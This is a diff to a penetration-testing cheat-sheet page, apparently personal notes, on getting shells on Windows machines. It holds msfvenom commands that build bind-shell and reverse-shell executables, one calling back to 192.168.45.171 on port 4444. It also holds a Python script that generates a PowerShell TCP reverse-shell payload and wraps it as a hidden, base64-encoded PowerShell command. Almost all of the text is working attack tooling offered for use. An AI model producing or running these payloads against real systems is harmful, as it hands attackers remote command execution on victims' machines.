@@ -39,24 +39,29 @@ public:: true
 	  ```bash
 	  msfvenom -p windows/x64/powershell_bind_tcp PORT=4444 -f exe > bind_ps_4444.exe
 	  ```
-- `reverse-shell-windows.py`
-	- ```python
-	  #!/usr/bin/python3
-	  #
-	  # Usage: python3 reverse-shell-windows.py YOUR_IP 4444
-	  #
-	  
-	  import sys
-	  import base64
-	  
-	  payload = '$client = New-Object System.Net.Sockets.TCPClient("' + sys.argv[1] + '",' + sys.argv[2] + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-	  
-	  print(payload)
-	  
-	  print("")
-	  
-	  cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-	  
-	  print(cmd)
-	  
+- Reverse Shell
+	- `cmd` binary
 	  ```
+	  msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.45.171 LPORT=4444 -f exe > reverse_cmd_4444.exe
+	  ```
+	- `reverse-shell-windows.py`
+		- ```python
+		  #!/usr/bin/python3
+		  #
+		  # Usage: python3 reverse-shell-windows.py YOUR_IP 4444
+		  #
+		  
+		  import sys
+		  import base64
+		  
+		  payload = '$client = New-Object System.Net.Sockets.TCPClient("' + sys.argv[1] + '",' + sys.argv[2] + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+		  
+		  print(payload)
+		  
+		  print("")
+		  
+		  cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+		  
+		  print(cmd)
+		  
+		  ```
